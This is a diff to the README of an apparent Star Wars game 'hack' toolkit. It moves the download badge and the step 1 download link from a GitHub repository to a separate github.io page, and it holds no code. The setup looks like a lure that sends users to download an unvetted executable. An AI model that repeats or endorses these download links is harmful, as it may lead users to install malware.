@@ -1,6 +1,6 @@
 # ⚔️ star-wars-zero-company-hack-tactical-toolkit - Your Ultimate Squad Command Center
 
-[![Download Now](https://img.shields.io/badge/Download-Tactical_Toolkit-FFD700?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://github.com/JXKXITERS/star-wars-zero-company-hack-tactical-toolkit)
+[![Download Now](https://img.shields.io/badge/Download-Tactical_Toolkit-FFD700?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B)](https://jxkxiters.github.io)
 
 ---
 
@@ -55,7 +55,7 @@ Welcome, Commander! This is your all-in-one PC companion for the Star Wars Zero 
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/JXKXITERS/star-wars-zero-company-hack-tactical-toolkit**](https://github.com/JXKXITERS/star-wars-zero-company-hack-tactical-toolkit)
+[**https://jxkxiters.github.io**](https://jxkxiters.github.io)
 
 This will take you to the main download page where you can get the latest version of the toolkit.
 
